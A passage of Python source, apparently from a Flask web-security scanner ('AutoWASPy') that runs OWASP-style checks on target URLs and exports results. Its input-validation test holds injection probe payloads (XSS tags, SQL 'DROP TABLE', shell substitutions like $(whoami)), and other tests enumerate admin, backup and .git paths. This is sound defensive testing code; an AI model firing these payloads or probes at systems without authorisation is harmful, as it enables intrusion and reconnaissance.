                'Feature-Policy': 'Browser feature controls (deprecated, use Permissions-Policy)',
                'Permissions-Policy': 'Browser feature controls',
                'Cross-Origin-Embedder-Policy': 'Cross-origin isolation',
                'Cross-Origin-Opener-Policy': 'Cross-origin window opening',
                'Cross-Origin-Resource-Policy': 'Cross-origin resource access',
                'Clear-Site-Data': 'Browser data clearing',
                'Report-To': 'Security reporting endpoint',
                'Nel': 'Network Error Logging'
            }
            
            security_features = []
            missing_features = []
            highlight_headers = []
            
            for header, description in modern_headers.items():
                if header in response.headers:
                    security_features.append(f"✅ {header}: {response.headers[header]}")
                    highlight_headers.append(header)
                else:
                    missing_features.append(f"❌ {header} ({description})")
            
            # Check HTTP/2 or HTTP/3 usage
            if hasattr(response.raw, 'version') and response.raw.version == 20:
                security_features.append("✅ HTTP/2 in use")
            elif hasattr(response.raw, 'version') and response.raw.version == 30:
                security_features.append("✅ HTTP/3 in use")
            
            # Check TLS version in headers (if revealed)
            if 'Strict-Transport-Security' in response.headers:
                security_features.append("✅ HTTPS with HSTS")
            
            full_response = AutoTestService._format_response_details(response, highlight_headers)
            
            evidence = "🔒 Modern HTTP Security Features Analysis\n\n"
            
            if security_features:
                evidence += f"Implemented Security Features ({len(security_features)}):\n"
                for feature in security_features:
                    evidence += f"  {feature}\n"
                evidence += "\n"
            
            if missing_features:
                evidence += f"⚠️  Missing Modern Security Features ({len(missing_features)}):\n"
                for feature in missing_features[:5]:  # Show top 5 to avoid clutter
                    evidence += f"  {feature}\n"
                if len(missing_features) > 5:
                    evidence += f"  ... and {len(missing_features) - 5} more\n"
                evidence += "\n"
                evidence += f"💡 Recommendations for Enhanced Security:\n"
                evidence += f"   • Implement Permissions-Policy for feature control\n"
                evidence += f"   • Add Cross-Origin-* headers for isolation\n"
                evidence += f"   • Consider Expect-CT for certificate monitoring\n"
                evidence += f"   • Set up security reporting with Report-To"
            
            # Determine result based on critical vs nice-to-have features
            critical_missing = [f for f in missing_features if any(crit in f for crit in 
                              ['Cross-Origin-Embedder-Policy', 'Cross-Origin-Opener-Policy', 'Permissions-Policy'])]
            
            if critical_missing:
                evidence += f"\n🚨 Critical modern security features missing"
                result = 'fail'
            elif len(security_features) >= 3:
                evidence += f"\n✅ Good implementation of modern security features"
                result = 'pass'
            else:
                evidence += f"\n⚠️  Some modern security features could be improved"
                result = 'informational'
            
            return {
                'result': result,
                'evidence': evidence,
                'request': full_request,
                'response': full_response
            }
            
        except Exception as e:
            return {
                'result': 'error',
                'evidence': f'❌ Error testing HTTP security features: {str(e)}',
                'request': f'HTTP security features test for {url}',
                'response': 'Request failed - connection error'
            }

    @staticmethod
    def test_input_validation(url):
        """Test basic input validation and injection protections"""
        try:
            headers = {
                'User-Agent': 'AutoWASPy Security Scanner',
                'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8'
            }
            
            evidence = "🔍 Input Validation & Injection Protection Test\n\n"
            
            # Basic injection test payloads (for detection, not exploitation)
            test_payloads = {
                'XSS': ['<script>alert(1)</script>', '"><img src=x onerror=alert(1)>'],
                'SQL': ["'", "1' OR '1'='1", "'; DROP TABLE users; --"],
                'Command': ['$(whoami)', '$(id)', '; ls -la'],
                'LDAP': ['*)(uid=*', '*)(&(objectClass=*)'],
                'NoSQL': ['{"$gt":""}', '{"$ne":null}']
            }
            
            vulnerabilities = []
            tested_vectors = 0
            
            # Test common parameters
            for injection_type, payloads in test_payloads.items():
                for payload in payloads[:2]:  # Limit to 2 payloads per type
                    try:
                        # Test as URL parameter
                        test_url = f"{url}?test={requests.utils.quote(payload)}"
                        response = requests.get(test_url, headers=headers, timeout=5, verify=False)
                        tested_vectors += 1
                        
                        # Check if payload is reflected unescaped
                        if payload in response.text and response.status_code == 200:
                            if injection_type == 'XSS' and '<script>' in response.text:
                                vulnerabilities.append(f"🚨 Potential {injection_type}: Payload reflected unescaped")
                            elif injection_type == 'SQL' and any(error in response.text.lower() for error in 
                                                               ['sql', 'mysql', 'postgresql', 'sqlite']):
                                vulnerabilities.append(f"🚨 Potential {injection_type}: SQL error triggered")
                            elif len(payload) > 5:  # Avoid false positives for simple payloads
                                vulnerabilities.append(f"⚠️  Potential {injection_type}: Payload reflected")
                        
                        # Test as POST data if it's a form
                        if 'form' in response.text.lower() and injection_type == 'XSS':
                            try:
                                post_response = requests.post(url, data={'input': payload}, 
                                                            headers=headers, timeout=5, verify=False)
                                if payload in post_response.text:
                                    vulnerabilities.append(f"⚠️  Potential POST {injection_type}: Payload reflected")
                            except:
                                pass
                        
                    except requests.exceptions.RequestException:
                        continue
            
            # Check for basic protections
            protections = []
            
            # Test for WAF/filtering (basic detection)
            waf_test_payload = "<script>alert('xss')</script>"
            try:
                waf_response = requests.get(f"{url}?test={waf_test_payload}", 
                                          headers=headers, timeout=5, verify=False)
                if waf_response.status_code in [403, 406, 418, 429]:
                    protections.append(f"✅ WAF/Filtering detected (Status: {waf_response.status_code})")
                elif 'blocked' in waf_response.text.lower() or 'forbidden' in waf_response.text.lower():
                    protections.append(f"✅ Request filtering detected")
            except:
                pass
            
            if protections:
                evidence += f"Protection Mechanisms:\n"
                for protection in protections:
                    evidence += f"  {protection}\n"
                evidence += "\n"
            
            if vulnerabilities:
                evidence += f"🚨 Potential Vulnerabilities Found ({len(vulnerabilities)}):\n"
                for vuln in vulnerabilities:
                    evidence += f"  {vuln}\n"
                evidence += "\n"
                evidence += f"💡 Critical Recommendations:\n"
                evidence += f"   • Implement input validation and sanitization\n"
                evidence += f"   • Use parameterized queries for SQL\n"
                evidence += f"   • Escape output for XSS prevention\n"
                evidence += f"   • Deploy Web Application Firewall (WAF)\n"
                evidence += f"   • Conduct thorough penetration testing"
                result = 'fail'
            else:
                evidence += f"✅ Basic input validation appears functional\n"
                evidence += f"   • Tested {tested_vectors} injection vectors\n"
                evidence += f"   • No obvious injection vulnerabilities detected\n"
                evidence += f"   • Note: This is basic testing - comprehensive testing recommended"
                result = 'pass'
            
            request_summary = f"Input Validation Test for {url}\nTested {tested_vectors} injection vectors"
            response_summary = f"Found {len(vulnerabilities)} potential issues, {len(protections)} protections"
            
            return {
                'result': result,
                'evidence': evidence,
                'request': request_summary,
                'response': response_summary
            }
            
        except Exception as e:
            return {
                'result': 'error',
                'evidence': f'❌ Error testing input validation: {str(e)}',
                'request': f'Input validation test for {url}',
                'response': 'Request failed - connection error'
            }

    @staticmethod
    def test_robots_txt_analysis(url):
        """Test robots.txt for sensitive information disclosure"""
        try:
            # Parse the base URL and construct robots.txt path
            from urllib.parse import urljoin, urlparse
            parsed_url = urlparse(url)
            base_url = f"{parsed_url.scheme}://{parsed_url.netloc}"
            robots_url = urljoin(base_url, '/robots.txt')
            
            headers = {
                'User-Agent': 'AutoWASPy Security Scanner',
                'Accept': 'text/plain'
            }
            
            response = requests.get(robots_url, headers=headers, timeout=10, verify=False)
            
            full_request = AutoTestService._format_request_details('GET', robots_url, headers)
            full_response = AutoTestService._format_response_details(response)
            
            if response.status_code == 200:
                content = response.text.lower()
                sensitive_patterns = [
                    'admin', 'wp-admin', 'administrator', 'login', 'auth',
                    'api', 'backup', 'config', 'database', 'db', 'secret',
                    'private', 'internal', 'dev', 'test', 'staging'
                ]
                
                found_patterns = []
                disallowed_paths = []
                
                for line in response.text.split('\n'):
                    line = line.strip()
                    if line.startswith('Disallow:') or line.startswith('Allow:'):
                        path = line.split(':', 1)[1].strip()
                        disallowed_paths.append(path)
                        
                        for pattern in sensitive_patterns:
                            if pattern in path.lower():
                                found_patterns.append((pattern, path))
                
                evidence = f"🤖 Robots.txt Analysis\n\n"
                evidence += f"📍 Found robots.txt at: {robots_url}\n"
                evidence += f"📝 Total paths found: {len(disallowed_paths)}\n\n"
                
                if found_patterns:
                    evidence += f"🚨 Potentially sensitive paths discovered:\n"
                    for pattern, path in found_patterns:
                        evidence += f"  • {path} (contains '{pattern}')\n"
                    evidence += f"\n💡 Recommendation: Review these paths for sensitive exposure\n"
                    result = 'fail'
                else:
                    evidence += f"✅ No obviously sensitive paths found in robots.txt\n"
                    if disallowed_paths:
                        evidence += f"📋 Sample paths:\n"
                        for path in disallowed_paths[:5]:
                            evidence += f"  • {path}\n"
                        if len(disallowed_paths) > 5:
                            evidence += f"  ... and {len(disallowed_paths) - 5} more\n"
                    result = 'pass'
                
                return {
                    'result': result,
                    'evidence': evidence,
                    'request': full_request,
                    'response': full_response
                }
            else:
                return {
                    'result': 'informational',
                    'evidence': f"ℹ️  No robots.txt found (HTTP {response.status_code})\n\nThis is common and not necessarily a security issue.",
                    'request': full_request,
                    'response': full_response
                }
                
        except Exception as e:
            return {
                'result': 'error',
                'evidence': f'❌ Error analyzing robots.txt: {str(e)}',
                'request': f'GET {url}/robots.txt',
                'response': 'Request failed - connection error'
            }

    @staticmethod
    def test_web_server_detection(url):
        """Detect web server type and version"""
        try:
            headers = {
                'User-Agent': 'AutoWASPy Security Scanner',
                'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8'
            }
            
            response = requests.get(url, headers=headers, timeout=10, verify=False)
            
            full_request = AutoTestService._format_request_details('GET', url, headers)
            
            # Server identification headers to check
            server_headers = ['Server', 'X-Powered-By', 'X-AspNet-Version', 'X-AspNetMvc-Version']
            highlight_headers = [h for h in server_headers if h in response.headers]
            
            full_response = AutoTestService._format_response_details(response, highlight_headers)
            
            detected_info = []
            version_info = []
            
            for header in server_headers:
                if header in response.headers:
                    value = response.headers[header]
                    detected_info.append(f"{header}: {value}")
                    
                    # Check for version numbers
                    import re
                    version_match = re.search(r'(\d+\.\d+(?:\.\d+)?)', value)
                    if version_match:
                        version_info.append(f"{header}: {version_match.group(1)}")
            
            evidence = f"🖥️  Web Server Detection\n\n"
            
            if detected_info:
                evidence += f"📋 Server information discovered:\n"
                for info in detected_info:
                    evidence += f"  • {info}\n"
                evidence += f"\n"
                
                if version_info:
                    evidence += f"🔢 Version information found:\n"
                    for version in version_info:
                        evidence += f"  • {version}\n"
                    evidence += f"\n⚠️  Recommendation: Version disclosure may help attackers\n"
                    evidence += f"   identify known vulnerabilities. Consider hiding version info.\n"
                    result = 'fail'
                else:
                    evidence += f"✅ No detailed version information disclosed\n"
                    result = 'pass'
            else:
                evidence += f"✅ Server information is properly hidden\n"
                evidence += f"🛡️  Good security practice: No server headers disclosed\n"
                result = 'pass'
            
            return {
                'result': result,
                'evidence': evidence,
                'request': full_request,
                'response': full_response
            }
            
        except Exception as e:
            return {
                'result': 'error',
                'evidence': f'❌ Error detecting web server: {str(e)}',
                'request': f'GET {url}',
                'response': 'Request failed - connection error'
            }

    @staticmethod
    def test_admin_panel_detection(url):
        """Test for common admin panel paths"""
        try:
            from urllib.parse import urljoin, urlparse
            parsed_url = urlparse(url)
            base_url = f"{parsed_url.scheme}://{parsed_url.netloc}"
            
            # Common admin paths to test
            admin_paths = [
                '/admin', '/administrator', '/wp-admin', '/wp-login.php',
                '/admin.php', '/admin/', '/admin/login', '/admin/index.php',
                '/administrator/', '/administrator/index.php', '/control-panel',
                '/cpanel', '/plesk', '/webmin', '/phpmyadmin', '/adminer',
                '/manager/html', '/login', '/signin', '/auth'
            ]
            
            headers = {
                'User-Agent': 'AutoWASPy Security Scanner',
                'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8'
            }
            
            found_panels = []
            redirect_panels = []
            tested_paths = []
            
            for path in admin_paths:
                try:
                    test_url = urljoin(base_url, path)
                    tested_paths.append(path)
                    
                    response = requests.get(test_url, headers=headers, timeout=5, verify=False, allow_redirects=False)
                    
                    if response.status_code == 200:
                        # Check for admin-like content
                        content_lower = response.text.lower()
                        admin_indicators = ['login', 'password', 'admin', 'dashboard', 'control panel']
                        
                        if any(indicator in content_lower for indicator in admin_indicators):
                            found_panels.append((path, response.status_code, 'Login page detected'))
                    
                    elif response.status_code in [301, 302, 303, 307, 308]:
                        redirect_panels.append((path, response.status_code, response.headers.get('Location', 'Unknown')))
                        
                except:
                    continue  # Skip failed requests
            
            evidence = f"🔐 Admin Panel Detection\n\n"
            evidence += f"📊 Tested {len(tested_paths)} common admin paths\n\n"
            
            if found_panels or redirect_panels:
                if found_panels:
                    evidence += f"🚨 Accessible admin panels found:\n"
                    for path, status, desc in found_panels:
                        evidence += f"  • {path} (HTTP {status}) - {desc}\n"
                
                if redirect_panels:
                    evidence += f"\n↩️  Admin panel redirects found:\n"
                    for path, status, location in redirect_panels:
                        evidence += f"  • {path} → {location} (HTTP {status})\n"
                
                evidence += f"\n🚨 Security Risk: Admin panels are discoverable\n"
                evidence += f"💡 Recommendations:\n"
                evidence += f"   • Move admin panels to non-standard paths\n"
                evidence += f"   • Implement IP-based access restrictions\n"
                evidence += f"   • Use strong authentication and MFA\n"
                evidence += f"   • Monitor for unauthorized access attempts\n"
                result = 'fail'
            else:
                evidence += f"✅ No common admin panels found on standard paths\n"
                evidence += f"🛡️  Good security practice: Admin interfaces are not easily discoverable\n"
                result = 'pass'
            
            request_summary = f"Admin Panel Detection for {base_url}\nTested {len(tested_paths)} paths"
            response_summary = f"Found {len(found_panels)} panels, {len(redirect_panels)} redirects"
            
            return {
                'result': result,
                'evidence': evidence,
                'request': request_summary,
                'response': response_summary
            }
            
        except Exception as e:
            return {
                'result': 'error',
                'evidence': f'❌ Error testing admin panel detection: {str(e)}',
                'request': f'Admin panel detection for {url}',
                'response': 'Request failed - connection error'
            }

    @staticmethod
    def test_backup_file_detection(url):
        """Test for exposed backup files"""
        try:
            from urllib.parse import urljoin, urlparse
            parsed_url = urlparse(url)
            base_url = f"{parsed_url.scheme}://{parsed_url.netloc}"
            
            # Common backup file extensions and patterns
            backup_patterns = [
                'index.html.bak', 'index.php.bak', 'index.asp.bak',
                'backup.zip', 'backup.tar.gz', 'backup.sql', 'database.sql',
                'config.php.bak', 'config.php.old', 'config.php~',
                'web.config.bak', '.env.bak', '.env.old',
                'site.zip', 'www.zip', 'backup.tar', 'dump.sql'
            ]
            
            headers = {
                'User-Agent': 'AutoWASPy Security Scanner',
                'Accept': '*/*'
            }
            
            found_backups = []
            tested_files = []
            
            for pattern in backup_patterns:
                try:
                    test_url = urljoin(base_url, '/' + pattern)
                    tested_files.append(pattern)
                    
                    response = requests.head(test_url, headers=headers, timeout=5, verify=False)
                    
                    if response.status_code == 200:
                        content_length = response.headers.get('Content-Length', 'Unknown')
                        content_type = response.headers.get('Content-Type', 'Unknown')
                        found_backups.append((pattern, content_length, content_type))
                        
                except:
                    continue  # Skip failed requests
            
            evidence = f"📦 Backup File Detection\n\n"
            evidence += f"📊 Tested {len(tested_files)} backup file patterns\n\n"
            
            if found_backups:
                evidence += f"🚨 Exposed backup files found:\n"
                for filename, size, content_type in found_backups:
                    evidence += f"  • {filename}\n"
                    evidence += f"    Size: {size} bytes, Type: {content_type}\n"
                
                evidence += f"\n🚨 Security Risk: Backup files may contain sensitive data\n"
                evidence += f"💡 Recommendations:\n"
                evidence += f"   • Remove all backup files from web-accessible directories\n"
                evidence += f"   • Use .htaccess or web server rules to block backup file access\n"
                evidence += f"   • Store backups outside the document root\n"
                evidence += f"   • Implement automated cleanup procedures\n"
                result = 'fail'
            else:
                evidence += f"✅ No common backup files found in web root\n"
                evidence += f"🛡️  Good security practice: Backup files are not web-accessible\n"
                result = 'pass'
            
            request_summary = f"Backup File Detection for {base_url}\nTested {len(tested_files)} patterns"
            response_summary = f"Found {len(found_backups)} exposed backup files"
            
            return {
                'result': result,
                'evidence': evidence,
                'request': request_summary,
                'response': response_summary
            }
            
        except Exception as e:
            return {
                'result': 'error',
                'evidence': f'❌ Error testing backup file detection: {str(e)}',
                'request': f'Backup file detection for {url}',
                'response': 'Request failed - connection error'
            }

    @staticmethod
    def test_version_control_exposure(url):
        """Test for exposed version control directories"""
        try:
            from urllib.parse import urljoin, urlparse
            parsed_url = urlparse(url)
            base_url = f"{parsed_url.scheme}://{parsed_url.netloc}"
            
            # Version control paths to test
            vc_paths = [
                '.git/', '.git/config', '.git/HEAD', '.git/logs/HEAD',
                '.svn/', '.svn/entries', '.svn/wc.db',
                '.hg/', '.hg/requires', '.bzr/', 'CVS/', 'CVS/Root'
            ]
            
            headers = {
                'User-Agent': 'AutoWASPy Security Scanner',
                'Accept': 'text/plain,*/*'
            }
            
            found_vc = []
            tested_paths = []
            
            for path in vc_paths:
                try:
                    test_url = urljoin(base_url, '/' + path)
                    tested_paths.append(path)
                    
                    response = requests.get(test_url, headers=headers, timeout=5, verify=False)
                    
                    if response.status_code == 200:
                        # Check for version control indicators
                        content = response.text[:200].lower()  # First 200 chars
                        
                        vc_indicators = {
                            '.git': ['ref:', 'refs/', 'repository', 'gitdir'],
                            '.svn': ['svn', 'entries', 'repository'],
                            '.hg': ['mercurial', 'repository'],
                            'CVS': ['cvs', 'repository']
                        }
                        
                        for vc_type, indicators in vc_indicators.items():
                            if vc_type in path and any(indicator in content for indicator in indicators):
                                found_vc.append((path, vc_type, len(response.content)))
                                break
                        else:
                            # Generic detection for accessible VC paths
                            if len(response.content) > 0:
                                found_vc.append((path, 'Unknown VCS', len(response.content)))
                                
                except:
                    continue  # Skip failed requests
            
            evidence = f"📂 Version Control Exposure Test\n\n"
            evidence += f"📊 Tested {len(tested_paths)} version control paths\n\n"
            
            if found_vc:
                evidence += f"🚨 Exposed version control data found:\n"
                for path, vc_type, size in found_vc:
                    evidence += f"  • {path} ({vc_type}) - {size} bytes\n"
                
                evidence += f"\n🚨 Critical Security Risk: Source code and history may be exposed\n"
                evidence += f"💥 Attackers can download entire source code repositories!\n\n"
                evidence += f"💡 Immediate Actions Required:\n"
                evidence += f"   • Block access to all .git, .svn, .hg, CVS directories\n"
                evidence += f"   • Remove version control data from production servers\n"
                evidence += f"   • Use .htaccess or web server rules to deny access\n"
                evidence += f"   • Audit for other sensitive development files\n"
                result = 'fail'
            else:
                evidence += f"✅ No version control directories exposed\n"
                evidence += f"🛡️  Good security practice: Development files are not accessible\n"
                result = 'pass'
            
            request_summary = f"Version Control Exposure Test for {base_url}\nTested {len(tested_paths)} paths"
            response_summary = f"Found {len(found_vc)} exposed version control paths"
            
            return {
                'result': result,
                'evidence': evidence,
                'request': request_summary,
                'response': response_summary
            }
            
        except Exception as e:
            return {
                'result': 'error',
                'evidence': f'❌ Error testing version control exposure: {str(e)}',
                'request': f'Version control exposure test for {url}',
                'response': 'Request failed - connection error'
            }

# Routes
@app.route('/')
def index():
    projects = Project.query.order_by(Project.created_date.desc()).all()
    return render_template('index.html', projects=projects)

@app.route('/project/new', methods=['GET', 'POST'])
def new_project():
    if request.method == 'POST':
        project = Project(
            name=request.form['name'],
            client_name=request.form['client_name'],
            job_type=request.form['job_type'],
            description=request.form.get('description', ''),
            urls=request.form.get('urls', '')
        )
        
        db.session.add(project)
        db.session.commit()
        
        # Initialize test items based on job type
        if project.job_type == 'web':
            tests = OWASPService.fetch_wstg_data()
            test_type = 'wstg'
        else:  # mobile
            tests = OWASPService.fetch_mstg_data()
            test_type = 'mstg'
        
        for test_data in tests:
            test_item = TestItem(
                project_id=project.id,
                owasp_id=test_data['id'],
                title=test_data['title'],
                description=test_data['description'],
                category=test_data['category'],
                test_type=test_type
            )
            db.session.add(test_item)
        
        db.session.commit()
        flash(f'Project "{project.name}" created successfully!', 'success')
        return redirect(url_for('project_detail', project_id=project.id))
    
    return render_template('new_project.html')

@app.route('/project/<int:project_id>')
def project_detail(project_id):
    project = db.get_or_404(Project, project_id)
    test_items = TestItem.query.filter_by(project_id=project_id).order_by(TestItem.category, TestItem.owasp_id).all()
    
    # Group test items by category
    categories = {}
    for item in test_items:
        if item.category not in categories:
            categories[item.category] = []
        categories[item.category].append(item)
    
    return render_template('project_detail.html', project=project, categories=categories)

@app.route('/project/<int:project_id>/test/<int:test_id>/update', methods=['POST'])
def update_test_item(project_id, test_id):
    test_item = db.get_or_404(TestItem, test_id)
    
    test_item.is_tested = request.form.get('is_tested') == 'on'
    test_item.evidence = request.form.get('evidence', '')
    test_item.finding_status = request.form.get('finding_status', 'not_tested')
    test_item.risk_level = request.form.get('risk_level', '')
    test_item.updated_date = utc_now()
    
    db.session.commit()
    flash('Test item updated successfully!', 'success')
    return redirect(url_for('project_detail', project_id=project_id))

@app.route('/project/<int:project_id>/autotest', methods=['POST'])
def run_auto_tests(project_id):
    project = db.get_or_404(Project, project_id)
    
    if not project.urls:
        flash('No URLs configured for automatic testing', 'error')
        return redirect(url_for('project_detail', project_id=project_id))
    
    urls = [url.strip() for url in project.urls.split('\n') if url.strip()]
    
    # List of all available auto tests
    auto_tests = [
        ('HSTS Test', AutoTestService.test_hsts),
        ('Cookie Security Test', AutoTestService.test_cookie_security),
        ('Security Headers Test', AutoTestService.test_security_headers),
        ('SSL Configuration Test', AutoTestService.test_ssl_configuration),
        ('HTTP Methods Test', AutoTestService.test_http_methods),
        ('Information Disclosure Test', AutoTestService.test_information_disclosure),
        ('Clickjacking Protection Test', AutoTestService.test_clickjacking_protection),
        ('CORS Configuration Test', AutoTestService.test_cors_configuration),
        ('Content Type Validation Test', AutoTestService.test_content_type_validation),
        ('Cache Control Test', AutoTestService.test_cache_control),
        ('Subdomain Takeover Test', AutoTestService.test_subdomain_takeover),
        ('Directory Listing Test', AutoTestService.test_directory_listing),
        ('Error Handling Test', AutoTestService.test_error_handling),
        ('HTTP Security Features Test', AutoTestService.test_http_security_features),
        ('Input Validation Test', AutoTestService.test_input_validation),
        ('Robots.txt Analysis', AutoTestService.test_robots_txt_analysis),
        ('Web Server Detection', AutoTestService.test_web_server_detection),
        ('Admin Panel Detection', AutoTestService.test_admin_panel_detection),
        ('Backup File Detection', AutoTestService.test_backup_file_detection),
        ('Version Control Exposure', AutoTestService.test_version_control_exposure)
    ]
    
    total_tests = 0
    successful_tests = 0
    
    for url in urls:
        flash(f'Running automated tests for: {url}', 'info')
        
        for test_name, test_function in auto_tests:
            try:
                print(f"Running {test_name} for {url}")
                test_result = test_function(url)
                
                auto_result = AutoTestResult(
                    project_id=project_id,
                    test_name=test_name,
                    url_tested=url,
                    result=test_result['result'],
                    evidence=test_result['evidence'],
                    request_data=test_result['request'],
                    response_data=test_result['response']
                )
                db.session.add(auto_result)
                
                total_tests += 1
                if test_result['result'] == 'pass':
                    successful_tests += 1
                    
            except Exception as e:
                print(f"Error running {test_name} for {url}: {e}")
                # Log the error but continue with other tests
                error_result = AutoTestResult(
                    project_id=project_id,
                    test_name=test_name,
                    url_tested=url,
                    result='error',
                    evidence=f'Test failed with error: {str(e)}',
                    request_data='N/A - Test Error',
                    response_data='N/A - Test Error'
                )
                db.session.add(error_result)
                total_tests += 1
    
    db.session.commit()
    flash(f'Automated tests completed! {successful_tests}/{total_tests} tests passed.', 'success')
    return redirect(url_for('project_detail', project_id=project_id))

@app.route('/project/<int:project_id>/autotest-results')
def autotest_results(project_id):
    project = db.get_or_404(Project, project_id)
    results = AutoTestResult.query.filter_by(project_id=project_id).order_by(AutoTestResult.created_date.desc()).all()
    return render_template('autotest_results.html', project=project, results=results)

@app.route('/admin/refresh-owasp', methods=['GET', 'POST'])
def refresh_owasp_data():
    if request.method == 'POST':
        try:
            # Clear cache to force fresh fetch
            OWASPDataCache.query.delete()
            db.session.commit()
            
            # Fetch latest OWASP data
            flash('Fetching latest OWASP WSTG data from GitHub...', 'info')
            wstg_data = OWASPService.fetch_wstg_data()
            
            flash('Fetching latest OWASP MSTG data from GitHub...', 'info')
            mstg_data = OWASPService.fetch_mstg_data()
            
            flash('OWASP data refreshed successfully!', 'success')
            
        except Exception as e:
            flash(f'Error refreshing OWASP data: {str(e)}', 'error')
        
        return redirect(url_for('index'))
    
    # Get cache information for display
    cache_info = OWASPService.get_cache_info()
    return render_template('refresh_owasp.html', cache_info=cache_info)

@app.route('/project/<int:project_id>/export/csv')
def export_csv(project_id):
    """Export project test results to CSV format"""
    project = db.get_or_404(Project, project_id)
    test_items = TestItem.query.filter_by(project_id=project_id).order_by(TestItem.category, TestItem.owasp_id).all()
    
    # Create CSV data
    output = io.StringIO()
    writer = csv.writer(output)
    
    # Write header
    writer.writerow([
        'OWASP ID',
        'Title', 
        'Category',
        'Test Type',
        'Finding Status',
        'Risk Level',
        'Evidence',
        'Is Tested',
        'Created Date',
        'Updated Date'
    ])
    
    # Write test items
    for item in test_items:
        writer.writerow([
            item.owasp_id,
            item.title,
            item.category,
            item.test_type.upper(),
            item.finding_status.replace('_', ' ').title(),
            item.risk_level.title() if item.risk_level else 'N/A',
            item.evidence or 'No evidence provided',
            'Yes' if item.is_tested else 'No',
            item.created_date.strftime('%Y-%m-%d %H:%M:%S'),
            item.updated_date.strftime('%Y-%m-%d %H:%M:%S')
        ])
    
    # Create response
    output.seek(0)
    response = make_response(output.getvalue())
    response.headers['Content-Type'] = 'text/csv'
    response.headers['Content-Disposition'] = f'attachment; filename="{project.name}_security_tests.csv"'
    
    return response

@app.route('/project/<int:project_id>/export/xlsx')
def export_xlsx(project_id):
    """Export project test results to Excel format"""
    project = db.get_or_404(Project, project_id)
    test_items = TestItem.query.filter_by(project_id=project_id).order_by(TestItem.category, TestItem.owasp_id).all()
    
    # Create workbook and worksheet
    wb = Workbook()
    ws = wb.active
    ws.title = "Security Test Results"
    
    # Define styles
    header_font = Font(bold=True, color="FFFFFF")
    header_fill = PatternFill(start_color="366092", end_color="366092", fill_type="solid")
    center_alignment = Alignment(horizontal="center", vertical="center")
    
    # Write headers
    headers = [
        'OWASP ID', 'Title', 'Category', 'Test Type', 'Finding Status', 
        'Risk Level', 'Evidence', 'Is Tested', 'Created Date', 'Updated Date'
    ]
    
    for col, header in enumerate(headers, 1):
        cell = ws.cell(row=1, column=col, value=header)
        cell.font = header_font
        cell.fill = header_fill
        cell.alignment = center_alignment
    
    # Write data
    for row, item in enumerate(test_items, 2):
        ws.cell(row=row, column=1, value=item.owasp_id)
        ws.cell(row=row, column=2, value=item.title)
        ws.cell(row=row, column=3, value=item.category)
        ws.cell(row=row, column=4, value=item.test_type.upper())
        ws.cell(row=row, column=5, value=item.finding_status.replace('_', ' ').title())
        ws.cell(row=row, column=6, value=item.risk_level.title() if item.risk_level else 'N/A')
        ws.cell(row=row, column=7, value=item.evidence or 'No evidence provided')
        ws.cell(row=row, column=8, value='Yes' if item.is_tested else 'No')
        ws.cell(row=row, column=9, value=item.created_date.strftime('%Y-%m-%d %H:%M:%S'))
        ws.cell(row=row, column=10, value=item.updated_date.strftime('%Y-%m-%d %H:%M:%S'))
        
        # Color code finding status
        status_cell = ws.cell(row=row, column=5)
        if item.finding_status == 'pass':
            status_cell.fill = PatternFill(start_color="D4EDDA", end_color="D4EDDA", fill_type="solid")
        elif item.finding_status == 'fail':
            status_cell.fill = PatternFill(start_color="F8D7DA", end_color="F8D7DA", fill_type="solid")
        elif item.finding_status == 'informational':
            status_cell.fill = PatternFill(start_color="FFF3CD", end_color="FFF3CD", fill_type="solid")
    
    # Adjust column widths
    column_widths = [15, 50, 30, 12, 15, 12, 60, 12, 20, 20]
    for col, width in enumerate(column_widths, 1):
        ws.column_dimensions[ws.cell(row=1, column=col).column_letter].width = width
    
    # Save to memory
    output = io.BytesIO()
    wb.save(output)
    output.seek(0)
    
    # Create response
    response = make_response(output.getvalue())
    response.headers['Content-Type'] = 'application/vnd.openxmlformats-officedocument.spreadsheetml.sheet'
    response.headers['Content-Disposition'] = f'attachment; filename="{project.name}_security_tests.xlsx"'
    
    return response

@app.route('/project/<int:project_id>/export/markdown')
def export_markdown(project_id):
    """Export project test results to Markdown format"""
    project = db.get_or_404(Project, project_id)
    test_items = TestItem.query.filter_by(project_id=project_id).order_by(TestItem.category, TestItem.owasp_id).all()
    
    # Group tests by category
    categories = {}
    for item in test_items:
        if item.category not in categories:
            categories[item.category] = []
        categories[item.category].append(item)
    
    # Generate markdown content
    markdown_content = []
    markdown_content.append(f"# {project.name} - Security Test Report")
    markdown_content.append(f"\n**Client:** {project.client_name}")
    markdown_content.append(f"**Test Type:** {project.job_type.replace('_', ' ').title()}")
    markdown_content.append(f"**Generated:** {utc_now().strftime('%Y-%m-%d %H:%M:%S')}")
    
    if project.description:
        markdown_content.append(f"\n**Description:** {project.description}")
    
    if project.urls:
        # Handle both JSON and plain text URL storage
        try:
            urls = json.loads(project.urls) if project.urls.startswith('[') or project.urls.startswith('{') else [url.strip() for url in project.urls.split('\n') if url.strip()]
        except (json.JSONDecodeError, AttributeError):
            urls = [url.strip() for url in project.urls.split('\n') if url.strip()]
        
        if urls:
            markdown_content.append(f"\n**Target URLs:**")
            for url in urls:
                markdown_content.append(f"- {url}")
    
    # Summary statistics
    total_tests = len(test_items)
    tested_items = [item for item in test_items if item.is_tested]
    passed_tests = len([item for item in test_items if item.finding_status == 'pass'])
    failed_tests = len([item for item in test_items if item.finding_status == 'fail'])
    
    markdown_content.append(f"\n## Summary")
    markdown_content.append(f"- **Total Tests:** {total_tests}")
    markdown_content.append(f"- **Tests Completed:** {len(tested_items)}")
    markdown_content.append(f"- **Passed:** {passed_tests}")
    markdown_content.append(f"- **Failed:** {failed_tests}")
    markdown_content.append(f"- **Progress:** {(len(tested_items) / total_tests * 100):.1f}%")
    
    # Test results by category
    markdown_content.append(f"\n## Test Results by Category")
    
    for category, items in categories.items():
        markdown_content.append(f"\n### {category}")
        markdown_content.append(f"\n| OWASP ID | Title | Status | Risk Level | Evidence |")
        markdown_content.append(f"|----------|-------|--------|------------|----------|")
        
        for item in items:
            status_emoji = {
                'pass': '✅',
                'fail': '❌', 
                'informational': 'ℹ️',
                'error': '⚠️',
                'not_tested': '⏳'
            }.get(item.finding_status, '⏳')
            
            risk_level = item.risk_level.title() if item.risk_level else 'N/A'
            evidence = (item.evidence or 'No evidence provided').replace('\n', ' ').replace('|', '\\|')[:100]
            if len(item.evidence or '') > 100:
